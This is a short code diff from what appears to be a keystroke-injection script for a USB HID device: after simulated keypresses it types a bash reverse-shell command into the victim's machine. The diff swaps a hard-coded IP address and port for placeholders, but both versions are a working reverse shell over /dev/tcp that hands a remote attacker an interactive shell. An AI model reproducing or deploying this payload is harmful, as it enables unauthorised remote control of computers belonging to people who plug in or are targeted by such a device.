@@ -14,7 +14,7 @@ kbd.press(Keycode.T)
 kbd.release_all()
 time.sleep(1)
 
-reverse_shell_command = 'bash -c "bash -i >& /dev/tcp/143.110.151.11/12345 0>&1 & disown"'
+reverse_shell_command = 'bash -c "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1 & disown"'
 layout.write(f'{reverse_shell_command}' + '\n')
 
 
